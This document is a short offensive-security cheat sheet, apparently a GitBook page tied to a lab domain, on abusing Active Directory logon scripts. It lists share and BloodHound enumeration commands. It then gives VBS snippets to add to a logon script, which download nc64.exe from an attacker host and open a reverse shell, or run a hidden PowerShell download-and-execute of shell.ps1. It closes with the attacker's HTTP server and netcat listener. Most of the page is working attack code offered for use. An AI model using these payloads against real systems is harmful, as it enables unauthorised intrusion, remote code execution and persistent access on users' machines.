# Logon Script Abuse

### Check if you can update Logon script in SMB

```
crackmapexec smb $RHOST -u library -p library --shares
```



### Check if a logon script is configured for your target users

{% code overflow="wrap" %}
```bash
Kali> bloodhound.py -u 'library' -p 'library' -v --zip -c All -ns $RHOST -d baby2.vl -dc dc.baby2.vl
# Ensure you configure DC FQDN name in host file 
Kali> cme ldap $RHOST -u library -p library --bloodhound -ns $RHOST -c all
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

### Add vbs functions to the script

```bash
# Add the following to the script somewhere. 
Set oShell = CreateObject("Wscript.Shell")
oShell.run "cmd.exe /c curl 10.8.0.251/privesc/nc64.exe -o C:\Windows\Temp\nc64.exe"
oShell.run "cmd.exe /c C:\Windows\Temp\nc64.exe 10.8.0.251 1234 -e cmd.exe"
```

<figure><img src="../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

Another example:&#x20;

{% code overflow="wrap" %}
```bash
Set oShell = CreateObject("Wscript.Shell")
oShell.Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://10.8.0.251/shell.ps1')" 
```
{% endcode %}

### Wait for a moment to get this script running while preparing the reverse shell&#x20;

```bash
# HTTP Server
sudo python3 -m http.server 80

# Netcat listner
nc -nlvp 1234 
```
